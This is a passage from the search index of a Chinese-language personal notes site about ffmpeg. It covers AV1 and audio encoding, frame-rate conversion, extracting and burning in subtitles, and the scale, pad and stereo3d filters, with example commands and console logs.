QP:30.30\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#av1","title":"av1","text":"<p>Encode/AV1 \u2013 FFmpeg</p> <p>AV1 can achieve about 30% higher compression efficiency than VP9, and about 50% higher efficiency than H.264.</p> <p>\u73b0\u6709\u51e0\u79cd\u7f16\u7801\u5668\u53ef\u4ee5\u9009\u62e9</p> <ul> <li>libaom-av1<ul> <li>\u6162\u5230\u4e0d\u53ef\u7528\uff01</li> </ul> </li> <li>libsvtav1<ul> <li>\u53ef\u4ee5\u8dd1\u6ee1 128 \u4e2a\u6838\uff01\uff01\uff01</li> <li>SVT-AV1 (<code>libsvtav1</code>) is an encoder originally developed by Intel in collaboration with Netflix.</li> <li>The encoder supports a wide range of speed-efficiency tradeoffs and scales fairly well across many CPU cores.</li> </ul> </li> </ul> <p>Constant Quality:</p> <p>libaom-av1 has a constant quality (CQ) mode (like CRF in x264 and x265) which will ensure that every frame gets the number of bits it deserves to achieve a certain (perceptual) quality level, rather than encoding each frame to meet a bit rate target. This results in better overall quality. If you do not need to achieve a fixed target file size, this should be your method of choice.</p> <pre><code>ffmpeg -i input.mp4 -c:v libsvtav1 -crf 32 -preset 12 av1_test.mkv\n</code></pre> <p>Comparing SVT-AV1 Presets: Size, Quality, and Speed with CRF Variations - OTTVerse</p> <ul> <li>preset 1 \u5b9e\u5728\u592a\u6162\uff0c2 - 12 \u4e3a\u6709\u610f\u4e49\u7684\u503c</li> <li>2 -&gt; 12 \u901f\u5ea6\u63d0\u5347 124x</li> <li>6 -&gt; 12 \u901f\u5ea6\u63d0\u5347 6x</li> <li>CRF &gt;= 38, \u65e0\u8bba preset \u600e\u4e48\u53d8\uff0cVMAF &gt;= 95%</li> <li>2 -&gt; 12\uff0c\u6587\u4ef6\u5927\u5c0f\u589e\u52a0 20%</li> <li>6 \u548c 2 \u6700\u63a5\u8fd1\uff0c\u901f\u5ea6\u63d0\u5347 20x<ul> <li>\u53ea\u8003\u8651<code>[6, 12]</code></li> </ul> </li> </ul> <p></p> <p></p> Preset CRF Filesize (MB) Bitrate (kbps) PSNR (dB) SSIM VMAF Time (sec) FPS 2 38 32 26290.6 34.593 0.955 98.84 826.6 0.6 12 38 39 32693.4 32.99 0.936 95.90 6.1 81 Preset CRF Filesize (MB) Bitrake (kbps) PSNR (dB) SSIM VMAF Time (sec) FPS 2 26 75 62757.8 39.283 Bitrate (kbps) 99.709 974.094 0.5 4 26 75 62446.2 38.727 0.977 99.679 147.694 3.4 6 26 75 63023.0 38.439 0.975 99.565 53.14 9.4 8 26 81 67342.4 37.965 0.973 99.506 20.237 25 10 26 86 71827.7 37.677 0.97 99.446 10.524 48 12 26 92 77138.9 36.816 0.965 99.289 8.052 62","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u97f3\u9891","title":"\u97f3\u9891","text":"<p>Encode/HighQualityAudio \u2013 FFmpeg</p> <ul> <li>\u907f\u514d\u4ece\u4e00\u4e2a lossy \u683c\u5f0f\u8f6c\u7801\u6210\u53e6\u4e00\u4e2a lossy \u683c\u5f0f\uff0c\u6700\u597d\u76f4\u63a5 copy\u3002<ul> <li>Transcoding from a lossy format like\u00a0MP3,\u00a0AAC, Vorbis, Opus, WMA, etc. to the same or different lossy format might degrade the audio quality even if the bitrate stays the same (or higher).</li> </ul> </li> <li>libopus &gt; libvorbis &gt;= libfdk_aac &gt; libmp3lame &gt;= eac3/ac3 &gt; aac &gt; libtwolame &gt; vorbis &gt; mp2 &gt; wmav2/wmav1</li> <li>128, 384 k</li> </ul> <pre><code>fyyuan@icarus4 \u279c  Media ffmpeg -vn -i src.mkv -c:a aac -b:a 256k audio.mp3\nStream mapping:\n  Stream #0:1 -&gt; #0:0 (aac_latm (native) -&gt; aac (native))\nPress [q] to stop, [?] for help\n[mp3 @ 0x564c9fc61340] Invalid audio stream. Exactly one MP3 audio stream is required.\nCould not write header for output file #0 (incorrect codec parameters ?): Invalid argument\nError initializing output stream 0:0 --\n[aac @ 0x564c9fc60900] Qavg: nan\nConversion failed!\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u8c03\u8282\u5e27\u6570","title":"\u8c03\u8282\u5e27\u6570","text":"<p>ffmpeg - Best way to convert a 59.94fps video to 29.97? - Stack Overflow</p> <p>[FFmpeg-user] framerate conversion with sync audio (narkive.com) \u8fd9\u4f4d\u8001\u54e5\u7684\u9700\u6c42\u65f6\u5c06 24fps \u7684\u89c6\u9891\u8f6c\u6210 25fps\uff0c\u8981\u6c42\u5355\u7eaf\u53ea\u662f\u52a0\u901f\uff0c\u4e0d\u6539\u53d8 frame \u5185\u5bb9\u3002\u7531\u4e8e\u6539\u53d8\u4e86 video \u7684\u901f\u7387\uff0c\u56e0\u6b64\u4e5f\u8981\u540c\u65f6\u6539\u53d8 audio \u7684\u901f\u7387\uff0c\u6700\u540e\u7684\u7ed3\u679c\u547d\u4ee4</p> <ul> <li>\u6709\u8001\u54e5\u8bf4-r \u4e0d\u662f\u5f88\u53ef\u9760\uff0c\u5efa\u8bae\u4f7f\u7528<code>-vf setpts=PTS*0.8</code></li> <li>\u8fd8\u6709\u8001\u54e5\u63d0\u8bae\u6d4b\u8bd5\u4ee5\u4e0b<code>asetpts</code> filter \u662f\u5426\u53ef\u4ee5</li> </ul> <pre><code>ffmpeg -r 25 -i input_24fps.mov -af asetrate=50000,aresample=48000\u00a0-c:v  \nprores -profile:v 3 -c:a pcm_s24le output_25fps_resampledaudio.mov\n</code></pre> <p>What is video timescale, timebase, or timestamp in ffmpeg? - Stack Overflow</p> <ul> <li>\u6bcf frame \u5305\u542b timestamp \u4fe1\u606f\u3002Presentation\u00a0TimeStamps\uff0c\u8868\u793a\u5176\u5e94\u8be5\u663e\u793a\u7684\u65f6\u95f4\uff1f</li> <li>For the sake of precise resolution of these time values, a timebase is used\u3002\u6bd4\u5982 1/75 \u4e3a\u5355\u4f4d</li> <li>timescale \u5373 timebase \u7684\u5012\u6570\uff0cFFmpeg shows the timescale as the\u00a0<code>tbn</code>\u00a0value in the readout of a stream.</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5b57\u5e55","title":"\u5b57\u5e55","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#pgs-\u5b57\u5e55\u56fe\u50cf\u5b57\u5e55","title":"PGS \u5b57\u5e55\uff08\u56fe\u50cf\u5b57\u5e55\uff09","text":"<p>\u4f18\u70b9</p> <ul> <li>\u4e0d\u4f1a\u56e0\u7f3a\u5931\u5b57\u4f53\u800c\u663e\u793a\u4e0d\u6b63\u5e38\uff08\u76f8\u5bf9\u4e8e ASS\uff09</li> <li>\u652f\u6301\u5b57\u5e55\u7279\u6548</li> <li>\u76f8\u5bf9\u4e8e\u786c\u5b57\u5e55\uff0c\u53ef\u4ee5\u5207\u6362\u5b57\u5e55\u6d41 \u7f3a\u70b9</li> <li>\u4e00\u4e9b\u8001\u7535\u89c6\u53ef\u80fd\u4e0d\u652f\u6301 PGS \u5b57\u5e55</li> </ul> <p>\u81ea\u5df1\u52a8\u624b\u7ed9\u89c6\u9891\u6dfb\u52a0PGS/SUP\u5b57\u5e55_\u8f6f\u4ef6\u5e94\u7528_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</p> <p>\u4e5f\u6709\u4eba\u95ee\u5982\u4f55\u5c06 PGS \u5b57\u5e55\u538b\u5236\u6210\u786c\u5b57\u5e55 \u5982\u4f55\u5c06SUP\u5b57\u5e55\u538b\u5236\u5230\u7535\u5f71\u4e2d\uff0c\u6210\u4e3a\u786c\u5b57\u5e55 - \u5b57\u5e55 - \u97f3\u8f68 - \u56fd\u8bed\u89c6\u754c (cnlang.org)</p> <p>ffmpeg \u8c8c\u4f3c</p> <pre><code>ffmpeg -i c:\\xxxx.xxx -filter_complex \"[0:v][0:s]overlay[v]\" -map \"[v]\" -map 0:a:0 output.mp4\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u60f3\u5c1d\u8bd5\u4f7f\u7528-handbrake-\u538b\u5236","title":"\u60f3\u5c1d\u8bd5\u4f7f\u7528 handbrake \u538b\u5236","text":"<p>[PSG] Subtitles forced burn-in : r/handbrake (reddit.com) \u539f\u6765 mp4 \u5bf9\u4e8e PGS \u5b57\u5e55\u4f1a\u5f3a\u5236\u70e7\u5f55:</p> <p>If you're wanting an mp4 container, PGS is not supported and you should remove the track from your preset. If you don't manually remove the track, it forces an automatic \"burn-in\" behavior. If you switch to MKV you can use it normally; this is one of the main reasons I personally use mkv</p> <p>\u53d1\u73b0\u539f\u6765\u52fe\u4e0a burn in \u5c31\u597d\u4e86\uff0c\u5e76\u4e14\u4e0d\u80fd\u52fe\u9009\u4ec5\u9650\u5f3a\u5236\u3002mp4 \u5bf9\u4e8e sup \u9ed8\u8ba4\u662f\u70e7\u5f55\uff0c\u4e0d\u80fd\u4e5f\u4e0d\u7528\u9009\u3002</p> <p></p> <p>Note</p> <p>\u6709 Forien Track, Froien Track then first track\u3002\u7ffb\u8bd1\u9519\u8bef\uff0c\u5916\u8bed\u97f3\u8f68\u7ffb\u8bd1\u6210\u4e86\u5916\u90e8\u97f3\u8f68\u3002\u3002\u3002\u8fd9\u91cc\u7684\u70e7\u5f55\u884c\u4e3a\u7528\u4e8e\u63a7\u5236\u591a\u6761\u5b57\u5e55\u65f6\uff0c\u70e7\u5f55\u54ea\u4e00\u4e2a\u3002\u9009\u62e9 \u65e0 \u7684\u8bdd\uff0c\u5219\u90fd\u4e0d\u70e7\u5f55\u3002\u5f53\u7136\u65e0\u8bba\u600e\u4e48\u9009\uff0c\u4ecd\u7136\u53ef\u4ee5\u624b\u52a8\u52fe\u9009\u8fdb\u884c\u4fee\u6539\u3002\u53ea\u80fd\u70e7\u5f55\u4e00\u4e2a\u5b57\u5e55\u3002\u8fd8\u6709\u5b57\u5e55\u52a0\u8f7d\u884c\u4e3a\uff0c\u53ef\u4ee5\u9009\u62e9\u51e0\u4e2a\u8bed\u8a00\uff0c\u4f18\u5148\u52a0\u8f7d\u8fd9\u4e9b\u5b57\u5e55\u3002</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u6587\u672c\u5b57\u5e55","title":"\u6587\u672c\u5b57\u5e55","text":"<p>ass</p> <p>SRT</p> <p>\u5bf9\u6bd4\u524d\u9762\u4e00\u4e2a\u56fe\uff0c\u4e3a\u4ec0\u4e48ASS/SSA\u683c\u5f0f\u5b57\u5e55\u4f1a\u6bd4SRT\u5b57\u5e55\u9009\u9879\u5c11\u4e00\u4e9b\u5462\uff0c\u8fd9\u662f\u56e0\u4e3a\u4f60\u7684ASS/SSA\u5b57\u5e55\u6587\u4ef6\u4e2d\u5df2\u7ecf\u7ed9\u6bcf\u4e00\u884c\u5b57\u5e55\u6307\u5b9a\u4e86\u5b57\u4f53\u6837\u5f0f\u989c\u8272\u548c\u5927\u5c0f\uff0c\u8f6f\u4ef6\u4f1a\u6700\u5927\u7a0b\u5ea6\u7684\u9075\u7167\u683c\u5f0f\u6307\u5b9a\u6765\u5c55\u73b0\u5b57\u5e55\u3002\u800cSRT\u5b57\u5e55\u5e76\u6ca1\u6709\u8fd9\u4e9b\u6307\u5b9a\uff0c\u6240\u4ee5\u9700\u8981\u6211\u4eec\u9009\u62e9\u9700\u8981\u4f7f\u7528\u7684\u5b57\u4f53\u6837\u5f0f\u53ca\u5927\u5c0f\uff08\u56fe\u68073\uff09\uff0c\u5c4f\u5e55\u5bf9\u9f50\u65b9\u5f0f\u548c\u5de6\u53f3\u3001\u4e0a\u4e0b\u7684\u8fb9\u8ddd\uff08\u56fe\u68074\uff09\uff0c\u5b57\u5e55\u5b57\u4f53\u989c\u8272\uff08\u56fe\u68075\uff09\uff0c\u5b57\u4f53\u8fb9\u6846\u989c\u8272\u53ca\u8fb9\u6846\u5bbd\u5ea6\uff08\u56fe\u68076\uff09\uff0c\u5b57\u4f53\u9634\u5f71\u989c\u8272\uff0c\u5bbd\u5ea6\u53ca\u900f\u660e\u5ea6\uff08\u56fe\u68077\uff09\u3002\u8fd9\u4e9b\u5bf9\u4e8eSRT\u6765\u8bf4\u662f\u5168\u5c40\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u7684\u5b57\u5e55\u5b57\u4f53\u90fd\u4f1a\u9075\u7167\u8fd9\u4e2a\u8bbe\u7f6e\u3002</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#_1","title":"ffmpeg","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#extract","title":"extract","text":"<ul> <li>subrip: SubRip subtitle</li> <li>srt: SubRip subtitle with embedded timing</li> </ul> <pre><code>ffmpeg -ss 44 -i City.Hunter.2024.1080p.NF.WEB-DL.DUAL.DDP5.1.Atmos.H.264-FLUX.mkv -t 180 -c copy -map 0:v:0 -map 0:a:0 -map 0:s:36 city_hunter.mkv -y\n</code></pre> <p>\u901a\u8fc7 language \u9009\u62e9</p> <pre><code>ffmpeg -ss 44 -i City.Hunter.2024.1080p.NF.WEB-DL.DUAL.DDP5.1.Atmos.H.264-FLUX.mkv -t 180 -c copy -map 0:v:0 -map 0:a:0 -map 0:m:language:chi city_hunter.mkv\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#burn-to-video","title":"burn to video","text":"<pre><code>\u279c  Disk3 ffmpeg -i city_hunter_nosub.mkv -vf subtitles=city_hunter.chi.srt output.mp4\nffmpeg version N-113445-ge0da916b8f Copyright (c) 2000-2024 the FFmpeg developers\n  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04)\n  configuration: --prefix=/home/yfy/ffmpeg_build --pkg-config-flags=--static --extra-cflags='-I/home/yfy/ffmpeg_build/include -march=native' --extra-ldflags=-L/home/yfy/ffmpeg_build/lib --extra-libs='-lpthread -lm' --ld=g++ --bindir=/home/yfy/bin --enable-gpl --enable-libass --enable-libfdk-aac --enable-libfreetype --enable-libmp3lame --enable-libopus --enable-libsvtav1 --enable-libdav1d --enable-libvorbis --enable-libvpx --enable-libx264 --enable-libx265 --enable-nonfree\n  libavutil      58. 36.101 / 58. 36.101\n  libavcodec     60. 38.100 / 60. 38.100\n  libavformat    60. 20.100 / 60. 20.100\n  libavdevice    60.  4.100 / 60.  4.100\n  libavfilter     9. 17.100 /  9. 17.100\n  libswscale      7.  6.100 /  7.  6.100\n  libswresample   4. 13.100 /  4. 13.100\n  libpostproc    57.  4.100 / 57.  4.100\nInput #0, matroska,webm, from 'city_hunter_nosub.mkv':\n  Metadata:\n    ENCODER         : Lavf60.20.100\n  Duration: 00:03:02.04, start: 0.000000, bitrate: 5779 kb/s\n  Stream #0:0(jpn): Video: h264 (Main), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 24 fps, 24 tbr, 1k tbn (default) (original)\n      Metadata:\n        BPS             : 4791086\n        NUMBER_OF_FRAMES: 149832\n        NUMBER_OF_BYTES : 3738844388\n        _STATISTICS_WRITING_APP: mkvmerge v83.0 ('Circle Of Friends') 64-bit\n        _STATISTICS_TAGS: BPS DURATION NUMBER_OF_FRAMES NUMBER_OF_BYTES\n        DURATION        : 00:03:02.041000000\n  Stream #0:1(jpn): Audio: eac3 (Dolby Digital Plus + Dolby Atmos), 48000 Hz, 5.1(side), fltp, 768 kb/s (default) (original)\n      Metadata:\n        BPS             : 768000\n        NUMBER_OF_FRAMES: 195093\n        NUMBER_OF_BYTES : 599325696\n        _STATISTICS_WRITING_APP: mkvmerge v83.0 ('Circle Of Friends') 64-bit\n        _STATISTICS_TAGS: BPS DURATION NUMBER_OF_FRAMES NUMBER_OF_BYTES\n        DURATION        : 00:03:02.000000000\n[Parsed_subtitles_0 @ 0x5f46b3ffbd40] libass API version: 0x1502000\n[Parsed_subtitles_0 @ 0x5f46b3ffbd40] libass source: tarball: 0.15.2\n[Parsed_subtitles_0 @ 0x5f46b3ffbd40] Shaper: FriBidi 1.0.8 (SIMPLE) HarfBuzz-ng 2.7.4 (COMPLEX)\n[Parsed_subtitles_0 @ 0x5f46b3ffbd40] Using font provider fontconfig\nStream mapping:\n  Stream #0:0 -&gt; #0:0 (h264 (native) -&gt; h264 (libx264))\n  Stream #0:1 -&gt; #0:1 (eac3 (native) -&gt; aac (native))\nPress [q] to stop, [?] for help\n[aac @ 0x5f46b4dfd040] Using a PCE to encode channel layout \"5.1(side)\"\n[Parsed_subtitles_0 @ 0x7c8ac4003640] libass API version: 0x1502000\n[Parsed_subtitles_0 @ 0x7c8ac4003640] libass source: tarball: 0.15.2\n[Parsed_subtitles_0 @ 0x7c8ac4003640] Shaper: FriBidi 1.0.8 (SIMPLE) HarfBuzz-ng 2.7.4 (COMPLEX)\n[Parsed_subtitles_0 @ 0x7c8ac4003640] Using font provider fontconfig\n[libx264 @ 0x5f46b3ff2380] using SAR=1/1\n[libx264 @ 0x5f46b3ff2380] using cpu capabilities: MMX2 SSE2Fast SSSE3 SSE4.2 AVX FMA3 BMI2 AVX2\n[libx264 @ 0x5f46b3ff2380] profile High, level 4.0, 4:2:0, 8-bit\n[libx264 @ 0x5f46b3ff2380] 264 - core 163 r3060 5db6aa6 - H.264/MPEG-4 AVC codec - Copyleft 2003-2021 - http://www.videolan.org/x264.html - options: cabac=1 ref=3 deblock=1:0:0 analyse=0x3:0x113 me=hex subme=7 psy=1 psy_rd=1.00:0.00 mixed_ref=1 me_range=16 chroma_me=1 trellis=1 8x8dct=1 cqm=0 deadzone=21,11 fast_pskip=1 chroma_qp_offset=-2 threads=24 lookahead_threads=4 sliced_threads=0 nr=0 decimate=1 interlaced=0 bluray_compat=0 constrained_intra=0 bframes=3 b_pyramid=2 b_adapt=1 b_bias=0 direct=1 weightb=1 open_gop=0 weightp=2 keyint=250 keyint_min=24 scenecut=40 intra_refresh=0 rc_lookahead=40 rc=crf mbtree=1 crf=23.0 qcomp=0.60 qpmin=0 qpmax=69 qpstep=4 ip_ratio=1.40 aq=1:1.00\nOutput #0, mp4, to 'output.mp4':\n  Metadata:\n    encoder         : Lavf60.20.100\n  Stream #0:0(jpn): Video: h264 (avc1 / 0x31637661), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], q=2-31, 24 fps, 12288 tbn (default) (original)\n      Metadata:\n        BPS             : 4791086\n        NUMBER_OF_FRAMES: 149832\n        NUMBER_OF_BYTES : 3738844388\n        _STATISTICS_WRITING_APP: mkvmerge v83.0 ('Circle Of Friends') 64-bit\n        _STATISTICS_TAGS: BPS DURATION NUMBER_OF_FRAMES NUMBER_OF_BYTES\n        DURATION        : 00:03:02.041000000\n        encoder         : Lavc60.38.100 libx264\n      Side data:\n        cpb: bitrate max/min/avg: 0/0/0 buffer size: 0 vbv_delay: N/A\n  Stream #0:1(jpn): Audio: aac (LC) (mp4a / 0x6134706D), 48000 Hz, 5.1(side), fltp, 394 kb/s (default) (original)\n      Metadata:\n        BPS             : 768000\n        NUMBER_OF_FRAMES: 195093\n        NUMBER_OF_BYTES : 599325696\n        _STATISTICS_WRITING_APP: mkvmerge v83.0 ('Circle Of Friends') 64-bit\n        _STATISTICS_TAGS: BPS DURATION NUMBER_OF_FRAMES NUMBER_OF_BYTES\n        DURATION        : 00:03:02.000000000\n        encoder         : Lavc60.38.100 aac\n[Parsed_subtitles_0 @ 0x7c8ac4003640] fontselect: (Arial, 400, 0) -&gt; /usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf, 0, LiberationSans\n[Parsed_subtitles_0 @ 0x7c8ac4003640] Glyph 0x6211 not found, selecting one more font for (Arial, 400, 0)\n[Parsed_subtitles_0 @ 0x7c8ac4003640] fontselect: (Arial, 400, 0) -&gt; /usr/share/fonts/opentype/noto/NotoSansCJK-Regular.ttc, 0, NotoSansCJKjp-Regular\n[out#0/mp4 @ 0x5f46b3fdb400] video:69496kB audio:8768kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.155742%\nframe= 4369 fps=108 q=-1.0 Lsize=   78386kB time=00:03:01.95 bitrate=3529.1kbits/s speed=4.51x\n[libx264 @ 0x5f46b3ff2380] frame I:77    Avg QP:17.81  size: 86251\n[libx264 @ 0x5f46b3ff2380] frame P:1394  Avg QP:21.37  size: 28008\n[libx264 @ 0x5f46b3ff2380] frame B:2898  Avg QP:23.29  size:  8792\n[libx264 @ 0x5f46b3ff2380] consecutive B-frames:  6.2% 10.5% 16.8% 66.5%\n[libx264 @ 0x5f46b3ff2380] mb I  I16..4: 30.6% 49.3% 20.1%\n[libx264 @ 0x5f46b3ff2380] mb P  I16..4:  6.3% 14.1%  1.9%  P16..4: 34.2%  7.2%  3.7%  0.0%  0.0%    skip:32.7%\n[libx264 @ 0x5f46b3ff2380] mb B  I16..4:  0.6%  1.3%  0.2%  B16..8: 33.5%  2.2%  0.3%  direct: 1.7%  skip:60.1%  L0:43.8% L1:53.7% BI: 2.5%\n[libx264 @ 0x5f46b3ff2380] 8x8 transform intra:60.4% inter:83.4%\n[libx264 @ 0x5f46b3ff2380] coded y,uvDC,uvAC intra: 41.2% 53.9% 15.2% inter: 8.2% 13.8% 1.3%\n[libx264 @ 0x5f46b3ff2380] i16 v,h,dc,p: 26% 29%  6% 39%\n[libx264 @ 0x5f46b3ff2380] i8 v,h,dc,ddl,ddr,vr,hd,vl,hu: 26% 20% 20%  5%  6%  6%  6%  6%  5%\n[libx264 @ 0x5f46b3ff2380] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu: 25% 21% 12%  6%  8%  7%  8%  6%  6%\n[libx264 @ 0x5f46b3ff2380] i8c dc,h,v,p: 50% 24% 21%  5%\n[libx264 @ 0x5f46b3ff2380] Weighted P-Frames: Y:0.6% UV:0.6%\n[libx264 @ 0x5f46b3ff2380] ref P L0: 65.0% 13.1% 15.1%  6.8%  0.0%\n[libx264 @ 0x5f46b3ff2380] ref B L0: 87.5% 10.4%  2.1%\n[libx264 @ 0x5f46b3ff2380] ref B L1: 96.7%  3.3%\n[libx264 @ 0x5f46b3ff2380] kb/s:3127.34\n[aac @ 0x5f46b4dfd040] Qavg: 419.197\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#filter_1","title":"Filter","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#concat","title":"concat","text":"<p>Concatenate \u2013 FFmpeg</p> <p>There are two methods within ffmpeg that can be used to concatenate files of the same type:</p> <ol> <li>the concat ''demuxer''</li> <li>the concat ''protocol''</li> </ol>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#stereo3d","title":"stereo3d","text":"<p>\u4e0d\u77e5\u4e3a\u4ec0\u4e48\uff0c\u6211\u4f7f\u7528\u6709 bug\u3002tb \u786e\u5b9e\u80fd\u8f6c\u6210 sbs\uff0c\u4f46\u662f\u8f6c\u4e0d\u4e86 half\u3002\u5e76\u4e14\u8f6c\u7684\u901f\u5ea6\u975e\u5e38\u6162\uff0c\u7406\u8bba\u4e0a\u5e94\u8be5\u6ca1\u4ec0\u4e48\u8ba1\u7b97\uff0c\u53ea\u662f\u91cd\u7ec4\u4e0b\u50cf\u7d20\u3002\u8fdc\u6162\u4e8e scale\u3002\u6700\u540e\uff0c\u8f6c\u6362\u7684\u7ed3\u679c\u8fd8\u5f88\u5361\u987f\uff0c\u4e0d\u77e5\u9053\u662f\u4e3a\u4ec0\u4e48\u3002</p> <p>\u56e0\u6b64 sbs -&gt; half sbs\uff0c\u5efa\u8bae\u8fd8\u662f\u4f7f\u7528 scale\u3002\u81f3\u4e8e tb \u8f6c sbs\uff0c\u8fd8\u4e0d\u77e5\u9053\u600e\u4e48\u641e\u3002</p> <p>FFmpeg Filters Documentation</p> <ul> <li><code>sbsl</code>: side by side parallel (left eye left, right eye right)</li> <li><code>sbs2l</code>: side by side parallel with half width resolution (left eye left, right eye right)</li> <li><code>abl</code>: above-below (left eye above, right eye below)<ul> <li><code>tbl</code>: same</li> </ul> </li> <li><code>ab2l</code>, <code>tb2l</code>: above-below with half height resolution (left eye above, right eye below)</li> </ul> <p>How to convert Top-and-Bottom 3d video to side-by-side 3d video with FFmpeg - Stack Overflow</p> <pre><code>ffmpeg -i top-and-bottom.mov -vf stereo3d=abl:sbsl -c:a copy side-by-side.mov\n</code></pre> <p>\u2018al\u2019</p> <ul> <li>alternating frames (left eye first, right eye second) \u2018ar\u2019</li> <li>alternating frames (right eye first, left eye second)</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#scale","title":"scale","text":"<pre><code>\u5c06 `input.mp4` \u7684\u89c6\u9891\u7f29\u653e\u5230 1280x720 \u7684\u5206\u8fa8\u7387\nffmpeg -i input.mp4 -vf \"scale=1280:720\" output.mp4\n\n# \u5c06\u89c6\u9891\u5bbd\u5ea6\u7f29\u653e\u5230 1280 \u50cf\u7d20\uff0c\u5e76\u4fdd\u6301\u7eb5\u6a2a\u6bd4\nffmpeg -i input.mp4 -vf \"scale=1280:-1\" output.mp4\n\n# \u4f7f\u7528 `pad` \u8fc7\u6ee4\u5668\u4e0e `scale` \u7ed3\u5408\uff1a\u4fdd\u6301\u539f\u59cb\u5c3a\u5bf8\uff0c\u5e76\u53ea\u7f29\u653e\u5230\u6307\u5b9a\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3002\n# \u8fd9\u4f1a\u7f29\u653e\u89c6\u9891\u4ee5\u9002\u5e94\u6307\u5b9a\u7684\u5206\u8fa8\u7387\uff0c\u540c\u65f6\u5728\u8fb9\u7f18\u586b\u5145\u9ed1\u8272\uff0c\u4ee5\u4fdd\u6301\u6307\u5b9a\u7684\u5c3a\u5bf8\u3002\nffmpeg -i input.mp4 -vf \"scale=1280:720:force_original_aspect_ratio=decrease,pad=1280:720:(ow-iw)/2:(oh-ih)/2\" output.mp4\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#pad","title":"pad","text":"<p>my_ffmpeg/padding at main \u00b7 afrum/my_ffmpeg (github.com)</p> <pre><code>ffmpeg -i input.mp4 -vf \"pad=WIDTH:HEIGHT:(ow-iw)/2:(oh-ih)/2\" -c:a copy output.mp4\n</code></pre> <ul> <li><code>WIDTH</code> \u548c <code>HEIGHT</code> \u662f\u76ee\u6807\u5206\u8fa8\u7387\u3002</li> <li><code>(ow-iw)/2</code> \u662f\u6c34\u5e73 left \u7684 padding\uff0cright \u6839\u636e width \u81ea\u52a8\u5f97\u51fa\u3002\u8fd9\u91cc (ow - iw)/2 \u8868\u793a\uff0c\u6c34\u5e73\u4e2d\u5fc3\u5bf9\u9f50\u3002</li> <li><code>(oh-ih)/2</code> \u662f\u5782\u76f4 top \u7684 padding\u3002</li> </ul> <p>\u7531\u4e8e\u53ef\u4ee5\u4f7f\u7528 ow, iw \u53d8\u91cf\u3002\u56e0\u6b64\u540e\u9762\u53ef\u4ee5\u56fa\u5b9a\u4f7f\u7528 <code>(ow-iw)/2:(oh-ih)/2</code> \uff0c\u9002\u7528\u4e8e\u6240\u6709\u4e2d\u5fc3\u5bf9\u9f50\u7684 padding \u573a\u666f\u3002</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#gpu-\u786c\u4ef6\u52a0\u901f","title":"GPU \u786c\u4ef6\u52a0\u901f","text":"<p>\u6d4b\u8bd5\u89c6\u9891\uff1a</p> <ul> <li>Big Buck Bunny \u00bb Download (blender.org)</li> <li>MP4 ( H.265 ) | Test Videos (test-videos.co.uk)</li> </ul> <p>\u53c2\u8003\u8d44\u6599\uff1a</p> <ul> <li>Hardware/VAAPI \u2013 FFmpeg</li> </ul> <p>\u67e5\u770b\u652f\u6301\u7684 h264 \u7f16\u89e3\u7801</p> <pre><code>ffmpeg -codecs|grep 264\n\nDEV.LS h264                 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (decoders: h264 h264_v4l2m2m h264_qsv h264_cuvid ) (encoders: libx264 libx264rgb h264_nvenc h264_omx h264_qsv h264_v4l2m2m h264_vaapi )\n</code></pre> <pre><code>ffmpeg -hwaccels\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#vaapi-\u6d4b\u8bd5","title":"vaapi \u6d4b\u8bd5","text":"<p>\u4f7f\u7528 vaapi 